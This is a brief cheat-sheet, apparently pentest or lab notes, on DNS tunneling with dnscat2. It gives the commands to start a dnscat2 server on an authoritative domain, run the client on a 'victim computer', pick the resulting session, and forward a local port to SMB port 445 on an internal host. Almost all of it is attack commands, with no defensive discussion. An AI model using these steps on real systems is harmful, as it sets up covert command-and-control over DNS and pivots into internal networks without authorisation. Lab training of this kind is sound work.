#tunneling #portredirect #linux #windows 

### DNSCAT2

1. Start a tcpdump

```bash
sudo tcpdump -i ens192 udp port 53
``` 

2. In the authouritative server start DNSCat server

```bash
dnscat2-server feline.corp
```

3. Victim computer execute the client

```bash
./dnscat feline.corp
```

4.  Select the windows from the server

```bash
window -i 1
```

5. Start the listener on the port 4455 which forwards the port to 445 on the server 172.16.2.11

```bash
listen 127.0.0.1:4455 172.16.2.11:445
```


